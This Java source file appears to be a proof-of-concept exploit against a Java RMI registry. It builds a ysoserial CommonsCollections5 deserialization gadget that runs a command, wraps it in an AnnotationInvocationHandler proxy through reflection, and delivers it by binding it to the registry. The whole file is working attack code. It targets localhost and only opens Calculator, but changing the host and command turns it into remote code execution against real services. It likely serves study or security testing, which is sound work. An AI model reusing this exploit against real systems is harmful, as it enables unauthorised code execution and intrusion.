package com.wu.attackRmi.Exploit;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;
import java.util.Map;

import ysoserial.payloads.CommonsCollections5;

public class AttackRegistryByBindAndAnnotationInvocationHandler {
    public static void main(String[] args) throws Exception{
        String host = "127.0.0.1";
        int port = 1099;
        Registry registry = LocateRegistry.getRegistry(host, port);
        Map<String, Object> map = new HashMap<>();
        Object payload = new CommonsCollections5().getObject("open /System/Applications/Calculator.app");
        map.put("CommonCollections5", payload);
        Constructor constructor =  Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler invocationHandler  = (InvocationHandler) constructor.newInstance(Override.class, map);
        Remote obj = (Remote) Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]{Remote.class}, invocationHandler);
        registry.bind("hello", obj);
    }
}
